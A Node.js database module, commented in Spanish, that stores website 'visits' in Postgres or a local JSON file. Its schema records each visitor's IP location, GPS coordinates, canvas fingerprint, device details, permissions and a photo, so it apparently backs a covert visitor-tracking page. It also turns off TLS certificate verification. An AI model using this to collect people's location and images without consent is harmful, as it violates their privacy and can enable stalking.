// Capa de datos.
// - Si existe la variable de entorno DATABASE_URL -> usa Postgres (persistente, para produccion).
// - Si NO existe -> usa un archivo JSON local (solo para probar en tu maquina).
//
// En Render/Vercel SIEMPRE define DATABASE_URL para que los datos queden guardados
// el tiempo que tu quieras (no se borran hasta que tu los elimines).

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const JSON_PATH = path.join(__dirname, 'data.json');
const USE_PG = !!process.env.DATABASE_URL;

let pool = null;

const COLUMNS = `
  id SERIAL PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  ip TEXT,
  ip_city TEXT,
  ip_region TEXT,
  ip_country TEXT,
  gps_lat TEXT,
  gps_lon TEXT,
  gps_accuracy TEXT,
  device_label TEXT,
  user_agent TEXT,
  platform TEXT,
  languages TEXT,
  timezone TEXT,
  screen TEXT,
  viewport TEXT,
  cpu_cores TEXT,
  device_memory TEXT,
  gpu TEXT,
  touch BOOLEAN,
  battery TEXT,
  canvas_fp TEXT,
  permissions TEXT,
  photo TEXT,
  referrer TEXT
`;

export async function initDb() {
  if (USE_PG) {
    const pg = await import('pg');
    const { Pool } = pg.default;
    pool = new Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false } // Render/Neon requieren SSL
    });
    await pool.query(`CREATE TABLE IF NOT EXISTS visits (${COLUMNS});`);
    console.log('[db] Postgres listo.');
  } else {
    if (!fs.existsSync(JSON_PATH)) fs.writeFileSync(JSON_PATH, '[]', 'utf8');
    console.log('[db] Modo archivo JSON local (data.json). Solo para pruebas.');
  }
}

function readJson() {
  try { return JSON.parse(fs.readFileSync(JSON_PATH, 'utf8')); }
  catch { return []; }
}
function writeJson(arr) {
  fs.writeFileSync(JSON_PATH, JSON.stringify(arr, null, 2), 'utf8');
}

export async function saveVisit(v) {
  if (USE_PG) {
    const q = `
      INSERT INTO visits
        (ip, ip_city, ip_region, ip_country, gps_lat, gps_lon, gps_accuracy,
         device_label, user_agent, platform, languages, timezone, screen, viewport,
         cpu_cores, device_memory, gpu, touch, battery, canvas_fp, permissions, photo, referrer)
      VALUES
        ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23)
      RETURNING id, created_at;`;
    const vals = [
      v.ip, v.ip_city, v.ip_region, v.ip_country, v.gps_lat, v.gps_lon, v.gps_accuracy,
      v.device_label, v.user_agent, v.platform, v.languages, v.timezone, v.screen, v.viewport,
      v.cpu_cores, v.device_memory, v.gpu, v.touch, v.battery, v.canvas_fp, v.permissions, v.photo, v.referrer
    ];
    const { rows } = await pool.query(q, vals);
    return rows[0];
  } else {
    const arr = readJson();
    const row = { id: arr.length ? arr[arr.length - 1].id + 1 : 1, created_at: new Date().toISOString(), ...v };
    arr.push(row);
    writeJson(arr);
    return { id: row.id, created_at: row.created_at };
  }
}

export async function listVisits() {
  if (USE_PG) {
    const { rows } = await pool.query('SELECT * FROM visits ORDER BY created_at DESC;');
    return rows;
  } else {
    return readJson().slice().reverse();
  }
}

export async function clearVisits() {
  if (USE_PG) {
    await pool.query('TRUNCATE visits RESTART IDENTITY;');
  } else {
    writeJson([]);
  }
}
